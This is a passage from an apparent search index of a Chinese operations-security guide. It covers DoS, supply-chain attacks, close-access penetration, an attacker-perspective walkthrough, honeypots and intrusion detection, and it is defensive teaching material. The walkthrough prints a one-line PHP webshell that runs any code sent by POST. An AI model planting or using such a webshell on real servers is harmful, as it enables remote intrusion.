\u200b\u653b\u51fb\u200b\u9488\u5bf9\u200b\u76ee\u6807\u200b\u670d\u52a1\u200b\uff08\u200b\u8f6f\u4ef6\u200b\uff09\u200b\u7684\u200b\u6f0f\u6d1e\u200b\uff0c\u200b\u4f8b\u5982\u200b\u53d1\u9001\u200b\u7279\u5b9a\u200b\u7684\u200b\u6570\u636e\u5305\u200b\u5bfc\u81f4\u200b\u670d\u52a1\u200b\u5d29\u6e83\u200b\uff0c\u200b\u5982\u679c\u200b\u4e0d\u505c\u200b\u53d1\u9001\u200b\uff0c\u200b\u90a3\u4e48\u200b\u670d\u52a1\u200b\u5c31\u200b\u65e0\u6cd5\u200b\u6b63\u5e38\u200b\u8fd0\u884c\u200b\u3002\u200b\u53e6\u200b\u4e00\u90e8\u5206\u200b\u8bf8\u5982\u200b SYN Flood\u3001UDP Flood \u200b\u7b49\u200b\u653b\u51fb\u200b\u5219\u200b\u662f\u200b\u5229\u7528\u200b\u7f51\u7edc\u534f\u8bae\u200b\u7684\u200b\u7279\u6027\u200b\uff0c\u200b\u5411\u200b\u76ee\u6807\u200b\u670d\u52a1\u5668\u53d1\u9001\u200b\u5927\u91cf\u200b\u7684\u200b\u6570\u636e\u5305\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u670d\u52a1\u5668\u200b\u65e0\u6cd5\u200b\u6b63\u5e38\u200b\u5904\u7406\u200b\u5408\u6cd5\u200b\u7684\u200b\u8bf7\u6c42\u200b\u3002</p> <p>\u200b\u5206\u5e03\u5f0f\u200b\u62d2\u7edd\u670d\u52a1\u200b\u653b\u51fb\u200b\uff08DDoS\uff0cDistributed Denial of Service\uff09\u200b\u662f\u200b\u4e00\u79cd\u200b\u66f4\u4e3a\u4e25\u91cd\u200b\u7684\u200b\u653b\u51fb\u65b9\u5f0f\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u63a7\u5236\u200b\u5927\u91cf\u200b\u7684\u200b\u8ba1\u7b97\u673a\u200b\uff08\u200b\u901a\u5e38\u200b\u662f\u200b\u50f5\u5c38\u200b\u7f51\u7edc\u200b\uff09\u200b\u53d1\u52a8\u200b\u6076\u610f\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u76ee\u6807\u200b\u670d\u52a1\u5668\u200b\u65e0\u6cd5\u200b\u6b63\u5e38\u200b\u5de5\u4f5c\u200b\uff1a\u200b\u60f3\u8c61\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u5982\u679c\u200b\u98df\u5802\u200b\u7a81\u7136\u200b\u6324\u6ee1\u200b\u4e86\u200b\u539f\u6765\u200b 100 \u200b\u500d\u200b\u7684\u200b\u4eba\u200b\uff0c\u200b\u90a3\u4e48\u200b\u6b63\u5e38\u200b\u7684\u200b\u7528\u6237\u200b\u5c31\u200b\u65e0\u6cd5\u200b\u8fdb\u5165\u200b\u98df\u5802\u200b\uff08\u200b\u5373\u4f7f\u200b\u8fdb\u53bb\u200b\u4e86\u200b\u4e5f\u200b\u6ca1\u6cd5\u200b\u6b63\u5e38\u200b\u70b9\u9910\u200b\u5403\u996d\u200b\uff09\uff0c\u200b\u8fd9\u200b\u5c31\u662f\u200b DDoS \u200b\u653b\u51fb\u200b\u7b80\u5355\u200b\u7c97\u66b4\u200b\u7684\u200b\u539f\u7406\u200b\u3002</p>"},{"location":"ops/security/#supply-chain-attacks","title":"\u4f9b\u5e94\u94fe\u200b\u653b\u51fb","text":"<p>\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u7684\u200b\u5b89\u88c5\u5305\u200b\u88ab\u200b\u7be1\u6539\u200b\uff0c\u200b\u7f16\u8bd1\u5668\u200b\u4f1a\u200b\u5728\u200b\u7f16\u8bd1\u200b\u65f6\u200b\u63d2\u5165\u200b\u6076\u610f\u4ee3\u7801\u200b\uff0c\u200b\u6216\u8005\u200b\u4f60\u200b\u4f7f\u7528\u200b\u7684\u200b\u8f6f\u4ef6\u200b\u81ea\u52a8\u66f4\u65b0\u200b\u7684\u200b\u65f6\u5019\u200b\u6ca1\u6709\u200b\u68c0\u67e5\u200b\u8f6f\u4ef6\u5305\u200b\u662f\u5426\u200b\u88ab\u200b\u7be1\u6539\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u901a\u8fc7\u200b\u4e2d\u95f4\u4eba\u200b\u653b\u51fb\u200b\u7ed9\u200b\u4f60\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u6076\u610f\u200b\u7684\u200b\u8f6f\u4ef6\u5305\u200b\u2026\u2026\u200b\u8bf8\u5982\u6b64\u7c7b\u200b\u653b\u51fb\u200b\u88ab\u200b\u79f0\u4e3a\u200b\u4f9b\u5e94\u94fe\u200b\u653b\u51fb\u200b\u3002</p> <p>\u200b\u56fd\u5185\u200b\u6700\u200b\u77e5\u540d\u200b\u7684\u200b\u4f9b\u5e94\u94fe\u200b\u653b\u51fb\u200b\u6848\u4f8b\u200b\u4e4b\u4e00\u200b\u662f\u200b XcodeGhost\u3002\u200b\u7531\u4e8e\u200b Xcode \u200b\u7279\u522b\u200b\u5927\u200b\uff0c\u200b\u56fd\u5185\u200b\u4e0b\u8f7d\u200b Xcode \u200b\u7f13\u6162\u200b\uff0c\u200b\u6709\u4eba\u200b\u5728\u200b\u767e\u5ea6\u7f51\u200b\u76d8\u200b\u4e0a\u4f20\u200b\u4e86\u200b\u4e00\u4e2a\u200b Xcode \u200b\u5b89\u88c5\u5305\u200b\u300c\u200b\u52a0\u901f\u200b\u300d\u200b\u4e0b\u8f7d\u200b\uff0c\u200b\u5e76\u4e14\u200b\u56db\u5904\u200b\u6563\u64ad\u200b\u7f51\u76d8\u200b\u4e0b\u8f7d\u200b\u94fe\u63a5\u200b\uff0c\u200b\u4f46\u662f\u200b\u8fd9\u4e2a\u200b\u5b89\u88c5\u5305\u200b\u88ab\u200b\u7be1\u6539\u200b\uff0c\u200b\u63d2\u5165\u200b\u4e86\u200b\u6076\u610f\u4ee3\u7801\u200b\uff0c\u200b\u518d\u200b\u52a0\u4e0a\u200b\u8bb8\u591a\u200b\u4eba\u200b\u5173\u95ed\u200b\u4e86\u200b Gatekeeper \u200b\u7b7e\u540d\u200b\u68c0\u67e5\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u4e86\u200b\u56fd\u5185\u200b\u5305\u62ec\u200b\u5fae\u4fe1\u200b\u3001\u200b\u7f51\u6613\u200b\u4e91\u200b\u97f3\u4e50\u200b\u5728\u5185\u200b\u7684\u200b\u5927\u91cf\u200b\u7684\u200b iOS \u200b\u5e94\u7528\u200b\u88ab\u200b\u611f\u67d3\u200b\u3002</p> <p>@tiankaima \u200b\u5173\u4e8e\u200b XcodeGhost</p> <p>\u200b\u4e0a\u8ff0\u200b\u95ee\u9898\u200b Apple \u200b\u5df2\u7ecf\u200b\u901a\u8fc7\u200b\u5206\u53d1\u200b <code>.xip</code> \u200b\u683c\u5f0f\u200b\u7684\u200b Xcode \u200b\u89e3\u51b3\u200b\uff0c\u200b\u4ece\u200b macOS Sierra \u200b\u8d77\u200b\uff0c\u200b\u53ea\u6709\u200b Apple \u200b\u7b7e\u540d\u200b\u7684\u200b <code>.xip</code> \u200b\u6587\u4ef6\u200b\u80fd\u200b\u88ab\u200b\u6b63\u786e\u200b\u89e3\u538b\u200b\u3002\u200b\u4f46\u200b\u4f9b\u5e94\u94fe\u200b\u653b\u51fb\u200b\u4ecd\u7136\u200b\u65f6\u6709\u53d1\u751f\u200b\uff0c\u200b\u53c2\u8003\u200b\uff1a</p> <ul> <li>\u200b\u65b0\u95fb\u200b\u9009\u6458\u200b\uff1aSSH \u200b\u8f6f\u4ef6\u200b\u4e0e\u200b\u540e\u95e8\u200b</li> <li>VSCode \u200b\u63d2\u4ef6\u200b\u540e\u95e8\u200b</li> <li>xz-utils \u200b\u540e\u95e8\u200b</li> <li>polyfill.io \u200b\u5b89\u5168\u200b\u95ee\u9898\u200b\uff08\u200b\u9875\u9762\u200b\u5907\u4efd\u200b\uff09</li> </ul> <p>\u200b\u9884\u9632\u200b\u8fd9\u200b\u7c7b\u200b\u653b\u51fb\u200b\u7684\u200b\u57fa\u672c\u200b\u539f\u5219\u200b\u662f\u200b\uff0c\u200b\u5bf9\u200b\u5305\u62ec\u200b\u5f00\u6e90\u200b\u9879\u76ee\u200b\u5728\u5185\u200b\u7684\u200b\u6240\u6709\u200b\u5de5\u5177\u200b\u4fdd\u6301\u200b\u6000\u7591\u200b\uff0c\u200b\u5e76\u200b\u603b\u662f\u200b\u4ece\u200b\u53ef\u4fe1\u200b\u6765\u6e90\u200b\u5b89\u88c5\u200b\u8f6f\u4ef6\u200b\uff1a</p> <ul> <li>\u200b\u4ece\u200b\u5b98\u65b9\u7f51\u7ad9\u200b\u4e0b\u8f7d\u200b\uff0c\u200b\u6216\u8005\u200b\u4f7f\u7528\u200b\u5305\u200b\u7ba1\u7406\u5668\u200b\u5b89\u88c5\u200b</li> <li>\u200b\u907f\u514d\u200b\u53ef\u7591\u200b\u7684\u200b\u7b2c\u4e09\u65b9\u200b\u6e90\u200b\uff08\u200b\u53ef\u7591\u200b\u955c\u50cf\u200b\u7ad9\u200b\u3001\u200b\u53ef\u7591\u200b CDN \u200b\u7ad9\u70b9\u200b\u3001\u200b\u7f51\u76d8\u200b\u518d\u200b\u5206\u53d1\u200b\u3001\u200b\u6c49\u5316\u7248\u200b\u3001\u200b\u7834\u89e3\u7248\u200b\u7b49\u200b\uff09</li> <li>\u200b\u5b89\u5168\u200b\u7a0b\u5ea6\u200b\u672a\u77e5\u200b\u7684\u200b\u8f6f\u4ef6\u200b\uff08&lt;1k \u200b\u4e0b\u8f7d\u200b\u7684\u200b VSCode \u200b\u63d2\u4ef6\u200b\uff09</li> <li>\u200b\u9002\u5f53\u200b\u5bf9\u200b\u4e0a\u6e38\u200b\u4ee3\u7801\u200b\u8fdb\u884c\u200b\u5ba1\u67e5\u200b\uff08\u200b\u5173\u6ce8\u200b\u975e\u200b\u9884\u671f\u200b\u884c\u4e3a\u200b\uff1a\u200b\u4e0d\u5408\u7406\u200b\u6743\u9650\u200b\u3001\u200b\u5f02\u5e38\u200b\u6587\u4ef6\u200b\u8bfb\u5199\u200b\u7b49\u200b\uff09\u200b\u5e76\u200b\u56fa\u5b9a\u200b\u7248\u672c\u200b</li> <li>\u200b\u5bc6\u5207\u200b\u5173\u6ce8\u200b\u5b89\u5168\u200b\u65b0\u95fb\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5728\u200b\u4e0a\u9762\u200b polyfill.io \u200b\u7684\u200b\u4f8b\u5b50\u200b\u4e2d\u200b\uff0cCloudflare \u200b\u6ce8\u610f\u200b\u5230\u200b\u4e86\u200b\u57df\u540d\u200b\u51fa\u552e\u200b\u7b49\u200b\u95ee\u9898\u200b\uff0c\u200b\u5e76\u200b\u53ca\u65f6\u200b\u901a\u77e5\u200b\u4e86\u200b\u4f9b\u5e94\u94fe\u200b\u98ce\u9669\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u540e\u7eed\u200b\u63aa\u65bd\u200b\u3002</li> </ul>"},{"location":"ops/security/#close-access-penetration","title":"\u8fd1\u6e90\u200b\u6e17\u900f","text":"<p>\u200b\u7f51\u7edc\u653b\u51fb\u200b\u4e0d\u200b\u4e00\u5b9a\u200b\u5fc5\u987b\u200b\u8981\u200b\u8fdc\u7a0b\u200b\u8fdb\u884c\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u91cd\u8981\u200b\u7684\u200b\u9ad8\u200b\u4ef7\u503c\u200b\u76ee\u6807\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u9009\u62e9\u200b\u8fd1\u6e90\u200b\u6e17\u900f\u200b\u3002\u200b\u4f8b\u5982\u200b\uff0c\u200b\u4e00\u4e9b\u200b\u673a\u6784\u200b\u7684\u200b\u7ba1\u7406\u200b\u53ef\u80fd\u200b\u4e0d\u200b\u4e25\u683c\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u672c\u4eba\u200b\u5149\u660e\u6b63\u5927\u200b\u7684\u200b\u8fdb\u5165\u200b\uff0c\u200b\u628a\u200b\u7f51\u7ebf\u200b\u63d2\u200b\u5230\u200b\u81ea\u5df1\u200b\u7535\u8111\u200b\u4e0a\u200b\uff0c\u200b\u7136\u540e\u200b\u76f4\u63a5\u200b\u5f00\u59cb\u200b\u653b\u51fb\u200b\u5185\u200b\u7f51\u200b\uff08\u200b\u5f53\u7136\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5bb9\u6613\u200b\u88ab\u200b\u6293\u4f4f\u200b\uff09\u3002\u200b\u653b\u51fb\u8005\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5c1d\u8bd5\u200b\u7834\u89e3\u200b\u673a\u6784\u200b\u5185\u7f51\u200b\u7684\u200b Wi-Fi \u200b\u5bc6\u7801\u200b\u7b49\u200b\u3002\u200b\u6b64\u5916\u200b\uff0c\u200b\u5982\u679c\u200b\u80fd\u591f\u200b\u7269\u7406\u200b\u63a5\u89e6\u200b\u5230\u200b\u8ba1\u7b97\u673a\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u611f\u67d3\u200b\u75c5\u6bd2\u200b\u7684\u200b U \u200b\u76d8\u200b\uff0c\u200b\u6216\u662f\u200b\u80fd\u591f\u200b\u6a21\u62df\u200b\u952e\u76d8\u200b/\u200b\u9f20\u6807\u200b\u7b49\u200b\u884c\u4e3a\u200b\u7684\u200b BadUSB \u200b\u5165\u4fb5\u200b\u8bbe\u5907\u200b\uff0c\u200b\u6216\u8005\u200b\u6dfb\u52a0\u200b\u786c\u4ef6\u200b\u5f62\u5f0f\u200b\u7684\u200b\u952e\u76d8\u8bb0\u5f55\u200b\u5668\u200b\uff0c\u200b\u4ee5\u4fbf\u200b\u4e3a\u200b\u540e\u7eed\u200b\u884c\u52a8\u200b\u505a\u597d\u200b\u51c6\u5907\u200b\u3002</p>"},{"location":"ops/security/#attacker-example","title":"\u4e3e\u4f8b\u200b\uff1a\u200b\u653b\u51fb\u8005\u200b\u89c6\u89d2\u200b\u4e0b\u200b\u7684\u200b\u653b\u51fb","text":"<p>\u200b\u4ee5\u4e0b\u200b\u4e3e\u200b\u4e00\u4e2a\u200b\u865a\u6784\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff1a\u200b\u5047\u8bbe\u200b\u76ee\u6807\u200b\u6709\u200b\u4e00\u4e2a\u200b\u66b4\u9732\u200b\u5728\u200b\u516c\u200b\u7f51\u4e0a\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6709\u200b\u767b\u5f55\u200b\u529f\u80fd\u200b\u7684\u200b Web \u200b\u5e94\u7528\u200b\u3002\u200b\u4f5c\u4e3a\u200b\u4e00\u4e2a\u200b\u653b\u51fb\u9762\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5c1d\u8bd5\u200b\uff1a</p> <ul> <li>\u200b\u7206\u7834\u200b\u5bc6\u7801\u200b\uff0c\u200b\u4f7f\u7528\u200b\u5e38\u89c1\u200b\u5bc6\u7801\u200b\u5b57\u5178\u200b\u5c1d\u8bd5\u200b\u767b\u5f55\u200b\u3002</li> <li>\u200b\u83b7\u53d6\u200b\u66f4\u200b\u591a\u200b\u4fe1\u606f\u200b\uff0c\u200b\u4f8b\u5982\u200b\u83b7\u53d6\u200b\u7f51\u7ad9\u200b\u4f7f\u7528\u200b\u7684\u200b\u6846\u67b6\u200b\u4e0e\u200b\u7248\u672c\u200b\u3001\u200b\u626b\u63cf\u200b\u76ee\u5f55\u200b\u5bfb\u627e\u200b\u662f\u5426\u200b\u6709\u200b\u7279\u6b8a\u200b\u7684\u200b\u6587\u4ef6\u200b\uff08\u200b\u751a\u81f3\u200b\u7f51\u7ad9\u200b\u6e90\u4ee3\u7801\u200b\uff09\u3001\u200b\u5229\u7528\u200b\u641c\u7d22\u5f15\u64ce\u200b\u5bfb\u627e\u200b\u662f\u5426\u200b\u6709\u200b\u5176\u4ed6\u200b\u7684\u200b\u4fe1\u606f\u200b\uff08\u200b\u8fd9\u200b\u88ab\u200b\u79f0\u4e3a\u200b Google Hacking\uff09\u3002</li> <li>\u200b\u6f0f\u6d1e\u200b\u626b\u63cf\u200b\uff0c\u200b\u4f7f\u7528\u200b\u81ea\u52a8\u5316\u200b\u5de5\u5177\u200b\u626b\u63cf\u200b\u76ee\u6807\u200b\u7f51\u7ad9\u200b\u662f\u5426\u200b\u5b58\u5728\u200b\u5e38\u89c1\u200b\u7684\u200b\u6f0f\u6d1e\u200b\uff0c\u200b\u4f8b\u5982\u200b SQL \u200b\u6ce8\u5165\u200b\u3001XSS \u200b\u7b49\u200b\u3002\u200b\u5982\u679c\u200b\u662f\u200b\u4e8c\u6b21\u5f00\u53d1\u200b\u7684\u200b\u670d\u52a1\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ef\u80fd\u200b\u6709\u200b\u80fd\u591f\u200b\u5229\u7528\u200b\u7684\u200b 1-day/n-day \u200b\u6f0f\u6d1e\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u88ab\u200b\u4fee\u590d\u200b\u3002</li> </ul> <p>\u200b\u5047\u8bbe\u200b\u653b\u51fb\u8005\u200b\u83b7\u53d6\u200b\u5230\u200b\u4e86\u200b\u76ee\u6807\u200b\u7f51\u7ad9\u200b\u67d0\u4e2a\u200b\u7528\u6237\u200b\u7684\u200b\u6743\u9650\u200b\uff0c\u200b\u7531\u4e8e\u200b\u4e00\u822c\u200b\u7f51\u7ad9\u200b\u767b\u5f55\u200b\u540e\u200b\u4f1a\u200b\u63d0\u4f9b\u200b\u66f4\u200b\u591a\u529f\u80fd\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5c1d\u8bd5\u200b\u5229\u7528\u200b\u590d\u6742\u200b\u7684\u200b\u529f\u80fd\u200b\u6765\u200b\u83b7\u53d6\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u6743\u9650\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4e0a\u4f20\u200b\u6587\u4ef6\u200b\u5f97\u5230\u200b Webshell\u3002\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b PHP Webshell \u200b\u4ee3\u7801\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>&lt;?php eval($_POST['cmd']); ?&gt;\n</code></pre> <p>\u200b\u5982\u679c\u200b\u4e0a\u4f20\u200b\u6587\u4ef6\u200b\u7684\u200b\u76ee\u6807\u76ee\u5f55\u200b\u6ca1\u6709\u200b\u9650\u5236\u200b\uff0cWeb \u200b\u670d\u52a1\u5668\u200b\u5c31\u200b\u53ef\u80fd\u200b\u5c06\u200b\u653b\u51fb\u8005\u200b\u4e0a\u4f20\u200b\u7684\u200b\u6587\u4ef6\u200b\u5f53\u4f5c\u200b PHP \u200b\u811a\u672c\u200b\u6267\u884c\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b POST \u200b\u8bf7\u6c42\u200b\u6267\u884c\u200b\u4efb\u610f\u200b\u4ee3\u7801\u200b\u3002\u200b\u8fd9\u200b\u4e00\u7c7b\u200b\u53ef\u4ee5\u200b\u8ba9\u200b\u653b\u51fb\u8005\u200b\u5728\u200b\u8fdc\u7a0b\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u6267\u884c\u200b\u4efb\u610f\u200b\u4ee3\u7801\u200b\u7684\u200b\u6f0f\u6d1e\u200b\uff0c\u200b\u4e5f\u200b\u88ab\u200b\u79f0\u4e3a\u200b RCE\uff08Remote Code Execution\uff0c\u200b\u8fdc\u7a0b\u200b\u4ee3\u7801\u6267\u884c\u200b\uff09\u3002</p> <p>\u200b\u5728\u200b\u6210\u529f\u200b\u4e0a\u4f20\u200b\u4e4b\u540e\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u76f8\u5f53\u200b\u6210\u719f\u200b\u7684\u200b\u56fe\u5f62\u754c\u9762\u200b\u5de5\u5177\u200b\u300c\u200b\u767b\u5f55\u200b\u300dWebshell\uff0c\u200b\u5c31\u200b\u50cf\u200b\u7528\u200b VS Code Remote SSH \u200b\u8fde\u63a5\u200b\u670d\u52a1\u5668\u200b\u4e00\u6837\u200b\u987a\u7545\u200b\u5730\u200b\u6267\u884c\u547d\u4ee4\u200b\u3001\u200b\u4e0a\u4f20\u4e0b\u8f7d\u200b\u6587\u4ef6\u200b\u7b49\u200b\u3002\u200b\u6b64\u65f6\u200b\u653b\u51fb\u8005\u200b\u5c31\u200b\u6709\u200b\u4e86\u200b\u548c\u200b Web \u200b\u670d\u52a1\u5668\u200b\u8fdb\u7a0b\u200b\u5bf9\u5e94\u200b\u7528\u6237\u200b\u76f8\u540c\u200b\u7684\u200b\u6743\u9650\u200b\uff0c\u200b\u4e4b\u540e\u200b\u53ef\u4ee5\u200b\u5229\u7528\u200b\u540c\u6837\u200b\u6210\u719f\u200b\u7684\u200b\u5de5\u5177\u200b\uff08\u200b\u4f8b\u5982\u200b Metasploit\uff09\u200b\u8fdb\u4e00\u6b65\u200b\u63d0\u6743\u200b\u3001\u200b\u626b\u63cf\u200b\u5185\u200b\u7f51\u200b\u3001\u200b\u6a2a\u5411\u200b\u79fb\u52a8\u200b\u3002\u200b\u6b64\u65f6\u200b\u8fd9\u53f0\u200b\u673a\u5668\u200b\u5c31\u200b\u6ca6\u9677\u200b\u4e86\u200b\uff0c\u200b\u5e76\u4e14\u200b\u540c\u4e00\u200b\u5185\u7f51\u200b\u4e2d\u200b\u7684\u200b\u5176\u4ed6\u200b\u673a\u5668\u200b\u4e5f\u200b\u9762\u4e34\u200b\u7740\u200b\u540c\u6837\u200b\u7684\u200b\u98ce\u9669\u200b\u3002</p>"},{"location":"ops/security/#detection-response","title":"\u4e8b\u4e2d\u200b\uff1a\u200b\u68c0\u6d4b\u200b\u4e0e\u200b\u54cd\u5e94","text":""},{"location":"ops/security/#monitoring-alerting","title":"\u76d1\u63a7\u200b\u4e0e\u200b\u544a\u8b66","text":"<p>\u200b\u653b\u51fb\u8005\u200b\u7684\u200b\u884c\u4e3a\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\u90fd\u200b\u4f1a\u200b\u4ea7\u751f\u200b\u5f02\u5e38\u200b\u7684\u200b\u65e5\u5fd7\u200b\u3001\u200b\u6027\u80fd\u200b\u6570\u636e\u200b\u7b49\u200b\u3002\u200b\u6709\u5173\u200b\u65e5\u5fd7\u200b\u7684\u200b\u5185\u5bb9\u200b\u53ef\u200b\u53c2\u8003\u200b\u670d\u52a1\u200b\u4e0e\u200b\u65e5\u5fd7\u200b\u7ba1\u7406\u200b\uff0c\u200b\u6709\u5173\u200b\u76d1\u63a7\u200b\u4e0e\u200b\u544a\u8b66\u200b\u7684\u200b\u5177\u4f53\u5185\u5bb9\u200b\u53ef\u200b\u53c2\u8003\u200b\u6307\u6807\u200b\u76d1\u63a7\u200b\u4e0e\u200b\u544a\u8b66\u200b\u3002\u200b\u4ee5\u4e0b\u200b\u4ecb\u7ecd\u200b\u4e00\u4e9b\u200b\u4e0e\u200b\u5b89\u5168\u200b\u76f8\u5173\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002</p>"},{"location":"ops/security/#honeypots","title":"\u871c\u7f50","text":"<p>\u200b\u871c\u7f50\u200b\u662f\u200b\u4e00\u79cd\u200b\u7279\u6b8a\u200b\u7684\u200b\u7cfb\u7edf\u200b\uff0c\u200b\u4ece\u200b\u5916\u8868\u200b\u6765\u770b\u200b\u5b83\u200b\u548c\u200b\u6b63\u5e38\u200b\u8fd0\u884c\u200b\u7684\u200b\u7cfb\u7edf\u200b\u6ca1\u6709\u200b\u533a\u522b\u200b\uff0c\u200b\u4f46\u662f\u200b\u5b83\u200b\u5b9e\u9645\u4e0a\u200b\u6ca1\u6709\u200b\u5b9e\u9645\u200b\u7528\u9014\u200b\uff0c\u200b\u53ea\u200b\u7528\u6765\u200b\u5438\u5f15\u200b\u653b\u51fb\u8005\u200b\u3002\u200b\u871c\u7f50\u200b\u53ef\u4ee5\u200b\u7528\u6765\u200b\u6536\u96c6\u200b\u653b\u51fb\u8005\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u4f8b\u5982\u200b\u653b\u51fb\u8005\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b\u3001\u200b\u884c\u4e3a\u200b\u7b49\u200b\u3002\u200b\u871c\u7f50\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u7528\u6765\u200b\u5206\u6563\u200b\u653b\u51fb\u8005\u200b\u7684\u200b\u6ce8\u610f\u529b\u200b\uff0c\u200b\u8ba9\u200b\u653b\u51fb\u8005\u200b\u5728\u200b\u871c\u7f50\u200b\u4e0a\u200b\u6d6a\u8d39\u65f6\u95f4\u200b\uff0c\u200b\u4ece\u800c\u200b\u63a8\u8fdf\u200b\u5bf9\u200b\u771f\u6b63\u200b\u7cfb\u7edf\u200b\u7684\u200b\u653b\u51fb\u200b\uff0c\u200b\u7559\u51fa\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u65f6\u95f4\u200b\u4f9b\u200b\u7cfb\u7edf\u7ba1\u7406\u5458\u200b\u54cd\u5e94\u200b\u3002</p> <p>\u200b\u871c\u7f50\u200b\u793a\u4f8b\u200b\uff1aSSH</p> <p>\u200b\u516c\u7f51\u200b SSH \u200b\u626b\u63cf\u200b\u6bcf\u5929\u200b\u3001\u200b\u6bcf\u65f6\u6bcf\u523b\u200b\u90fd\u200b\u5728\u200b\u53d1\u751f\u200b\uff0c\u200b\u800c\u4e14\u200b\u8fd9\u79cd\u200b\u626b\u63cf\u200b\u901a\u5e38\u200b\u662f\u200b\u81ea\u52a8\u5316\u200b\u3001\u200b\u6210\u200b\u89c4\u6a21\u200b\u7684\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u642d\u5efa\u200b\u4e00\u4e2a\u200b\u5047\u200b\u7684\u200b ssh server\uff0c\u200b\u6765\u200b\u4e00\u200b\u7aa5\u200b\u653b\u51fb\u8005\u200b\u7684\u200b\u884c\u4e3a\u200b\u3002\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u4e00\u4e9b\u200b SSH \u200b\u871c\u7f50\u200b\u7684\u200b\u5b9e\u73b0\u200b\uff1a</p> <ul> <li>https://github.com/jaksi/sshesame</li> <li>https://github.com/iBug/fakessh</li> <li>https://github.com/skeeto/endlessh/</li> </ul> <p>\u200b\u4f5c\u4e3a\u200b\u53c2\u8003\u200b\uff0c\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u5728\u200b 2022 \u200b\u7aef\u53e3\u200b\u516c\u5f00\u200b\u4e00\u4e2a\u200b sshesame \u200b\u871c\u7f50\u200b\u5bb9\u5668\u200b\u7684\u200b\u547d\u4ee4\u200b\uff1a</p> <pre><code>docker run -it --rm \\\n    -p 2022:2022 \\\n    -v sshesame-data:/data \\\n    -v $(pwd)/sshesame.yaml:/config.yaml \\\n    ghcr.io/jaksi/sshesame\n</code></pre> <p>sshesame \u200b\u4f1a\u200b\u5c06\u200b\u6240\u6709\u200b\u8bb0\u5f55\u200b\u7684\u200b\u884c\u4e3a\u200b\u6253\u5370\u200b\u5230\u200b stdout, \u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>docker logs</code> \u200b\u67e5\u770b\u200b\u3002</p>"},{"location":"ops/security/#intrusion-detection","title":"\u5165\u4fb5\u200b\u68c0\u6d4b","text":"<p>\u200b\u5bf9\u4e8e\u200b\u9700\u8981\u200b\u8f83\u200b\u9ad8\u200b\u5b89\u5168\u6027\u200b\u7684\u200b\u7cfb\u7edf\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u90e8\u7f72\u200b\u5165\u4fb5\u200b\u68c0\u6d4b\u200b\u7cfb\u7edf\u200b\uff08IDS\uff0cIntrusion Detection System\uff09\u3002\u200b\u5e38\u89c1\u200b\u7684\u200b\u5165\u4fb5\u200b\u68c0\u6d4b\u200b\u7cfb\u7edf\u200b\u6709\u200b snort\u3001suricata \u200b\u7b49\u200b\u3002\u200b\u4e24\u8005\u200b\u5747\u200b\u9700\u8981\u200b\u76d1\u63a7\u200b\u7f51\u7edc\u6d41\u91cf\u200b\uff08\u200b\u4f8b\u5982\u200b\uff0csnort \u200b\u9700\u8981\u200b\u4f7f\u7528\u200b libpcap \u200b\u6293\u5305\u200b\uff09\uff0c\u200b\u6839\u636e\u200b\u9884\u5148\u200b\u8bbe\u5b9a\u200b\u7684\u200b\u89c4\u5219\u200b\u68c0\u6d4b\u200b\u662f\u5426\u200b\u5b58\u5728\u200b\u5f02\u5e38\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u5185\u200b\u7f51\u200b\u90e8\u7f72\u200b\u7684\u200b IDS \u200b\u7cfb\u7edf\u200b\uff0c\u200b\u5982\u679c\u200b\u68c0\u6d4b\u200b\u5230\u200b\u4e86\u200b\u5f02\u5e38\u200b\u6d41\u91cf\u200b\uff08\u200b\u4f8b\u5982\u200b\u77ed\u65f6\u95f4\u200b\u5927\u91cf\u200b SSH 